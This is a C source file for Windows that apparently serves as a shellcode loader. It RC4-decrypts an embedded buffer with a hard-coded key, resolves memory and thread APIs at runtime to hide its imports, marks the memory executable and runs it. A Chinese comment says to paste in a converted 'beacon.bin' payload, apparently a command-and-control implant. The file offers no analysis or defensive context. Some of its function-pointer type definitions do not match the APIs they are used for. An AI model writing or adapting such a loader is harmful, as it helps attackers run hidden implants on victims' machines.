#include <windows.h>
#include <stdio.h>

typedef LPVOID (WINAPI *VA_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *WE_t)(LPVOID, SIZE_T, SIZE_T, DWORD);
typedef HANDLE (WINAPI *CT_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD  (WINAPI *WF_t)(HANDLE, DWORD, LPVOID, DWORD, LPDWORD);

static void rc4(unsigned char *d, int n, const unsigned char *k, int kl){
    unsigned char S[256]; int i,j=0; unsigned char t;
    for(i=0;i<256;i++) S[i]=(unsigned char)i;
    for(i=0;i<256;i++){ j=(j+S[i]+k[i%kl])&0xff; t=S[i];S[i]=S[j];S[j]=t; }
    i=0;j=0;
    for(int x=0;x<n;x++){ i=(i+1)&0xff; j=(j+S[i])&0xff; t=S[i];S[i]=S[j];S[j]=t;
        d[x]^=S[(S[i]+S[j])&0xff]; }
}

int main(void){
    /* 用脚本把 /tmp/beacon.bin 转成 C 数组贴到这里，KEY 同改 */
    unsigned char buf[] = { /* __PLACEHOLDER_SHELLCODE__ */ };
    const unsigned char key[] = "k3yK3yK3y";
    int n = sizeof(buf);
    rc4(buf, n, key, 9);

    HMODULE k = GetModuleHandleA("kernel32.dll");
    VA_t VA = (VA_t)GetProcAddress(k,"VirtualAlloc");
    WF_t WF = (WF_t)GetProcAddress(k,"WriteProcessMemory");
    CT_t CT = (CT_t)GetProcAddress(k,"CreateThread");

    LPVOID mem = VA(NULL, n, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!mem) return 1;
    WF(GetCurrentProcess(), mem, buf, n, NULL);
    DWORD old;
    VirtualProtect(mem, n, PAGE_EXECUTE_READ, &old);
    HANDLE h = CT(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(h, INFINITE);
    return 0;
}
